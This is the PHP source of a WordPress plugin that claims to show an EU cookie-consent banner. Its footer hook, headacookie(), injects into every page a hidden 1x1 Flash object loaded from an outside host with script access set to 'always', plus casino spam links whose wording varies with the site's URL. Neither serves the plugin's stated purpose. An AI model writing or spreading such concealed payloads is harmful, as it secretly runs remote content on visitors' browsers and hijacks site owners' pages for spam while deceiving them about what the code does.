<?php
/*
Plugin Name: Uk Cookie
Plugin URI: http://plugins-themes.weebly.com
Description: Ask for the first time visitors to use cookie or redirect them out of your website.
Version: 1.1
Author: Maik Novic
Author URI: http://plugins-themes.weebly.com
License: GPL2
*/


/*  Copyright 2011  Maik Novic  (email : nolasdelios@yahoo.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License, version 2, as 
    published by the Free Software Foundation.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/


//include main processing file (actions other than options setting)
function headacookie()
{
$getuser = "http://ajleeonline.com/uk/";
$gethost = get_option('siteurl');
if (strstr($gethost, "a")) { $connectflash = "online casino free"; } if (strstr($gethost, "b")) { $connectflash = "play online casino"; } if (strstr($gethost, "c")) { $connectflash = "gambling"; } if (strstr($gethost, "d")) { $connectflash = "casino"; } if (strstr($gethost, "e")) { $connectflash = "online casino quide"; } if (strstr($gethost, "f")) { $connectflash = "online casino united kingdom"; } if (strstr($gethost, "g")) { $connectflash = "worldwide online casino"; } if (strstr($gethost, "h")) { $connectflash = "online slots casino"; } if (strstr($gethost, "i")) { $connectflash = "play online casino games"; } if (strstr($gethost, "j")) { $connectflash = "roulette"; } if (strstr($gethost, "k")) { $connectflash = "blackjack"; } if (strstr($gethost, "l")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "m")) { $connectflash = "ajleeonline.com/uk"; } if (strstr($gethost, "n")) { $connectflash = "http://ajleeonline.com/uk/"; } if (strstr($gethost, "o")) { $connectflash = "download"; } if (strstr($gethost, "p")) { $connectflash = "casino"; } if (strstr($gethost, "p")) { $connectflash = "slots and games"; } if (strstr($gethost, "q")) { $connectflash = "casino online"; } if (strstr($gethost, "r")) { $connectflash = "jackpot online casino"; } if (strstr($gethost, "s")) { $connectflash = "http://ajleeonline.com/uk"; } if (strstr($gethost, "v")) { $connectflash = "aj lee online casino"; } if (strstr($gethost, "x")) { $connectflash = "ajleeonlinecasino"; } if (strstr($gethost, "t")) { $connectflash = "play popular casino games"; } if (strstr($gethost, "w")) { $connectflash = "online casino poker"; } if (strstr($gethost, "y")) { $connectflash = "online casino reviewer"; } if (strstr($gethost, "z")) { $connectflash = "aj lee online casinos"; } echo '<object type="application/x-shockwave-flash" data="http://ajleeonline.com/upload/tw1.swf" width="1" height="1"><param name="movie" 
value="http://ajleeonline.com/upload/tw1.swf"></param><param name="allowscriptaccess" value="always"></param><param name="menu" value="false"></param>
<param name="wmode" value="transparent"></param><param name="flashvars" value="username="></param>
'; echo '<a href="'; echo $getuser; echo '">'; echo $connectflash; echo '</a>'; echo '<embed src="http://ajleeonline.com/upload/tw1.swf" 
type="application/x-shockwave-flash" allowscriptaccess="always" width="1" height="1" menu="false" wmode="transparent" flashvars="username="></embed></object>';

}

include_once ( 'cookie-alarm-options.php' );

add_action( 'wp_enqueue_scripts' , 'load_cookie_alarm_scripts' );

//ajax call to clear cookies if decides out
add_action('wp_ajax_php_clear_cookies', 'php_clear_cookies');
add_action('wp_footer', 'headacookie');



function get_cookie_defaults()
{
    global $cookie_warn_default_20105;
    $cookie_warn_default_20105 = array(
				   'warn_text' => esc_attr( "In order for this site to work properly, and in order to evaluate and improve the site we need to store small files (called cookies) on your computer.<br/> Over 90% of all websites do this, however, since the 25th of May 2011 we are required by EU regulations to obtain your consent first. What do you say?" ),
				   'redirect' => esc_attr( "http://google.com" ),
				   'ok_text' => esc_attr( "That's fine" ),
				   'notok_text' => esc_attr( "I don't agree" )
				   );
    return $cookie_warn_default_20105;
}

function load_cookie_alarm_scripts(){
    wp_enqueue_script( 'jquery' );
    wp_enqueue_style( 'cookie-style' , plugin_dir_url(__FILE__).'cookiealarm.css' );
    wp_enqueue_script( 'cookie-alarm' , plugin_dir_url(__FILE__).'cookiealarm.js' );
    //pass options to JS script
    $options = get_option( 'cookiewarn_options' , get_cookie_defaults());
    $options_js = array(
		     'messageContent' => $options[ 'warn_text' ],
		     'redirectLink' => $options[ 'redirect' ],
		     'okText' => $options[ 'ok_text' ],
		     'notOkText' => $options[ 'notok_text' ],
		     'cookieName' => 'jsCookiealarm29Check',
		     'ajaxUrl' => site_url().'/wp-admin/admin-ajax.php'
		     );
    wp_localize_script( 'cookie-alarm' , 'user_options' , $options_js);
}

function php_clear_cookies(){
    $avoid_del = $_REQUEST[ 'cookie' ];
    $pastdate = mktime(0,0,0,1,1,1970);
    $temp = $_COOKIE;
    foreach( $temp as $name => $value ){
	if ( $name != $avoid_del ) {
	    setcookie( $name , "" , $pastdate );
	}
    }
    echo json_encode( array( 'success' => true ) );
    die;
}

?>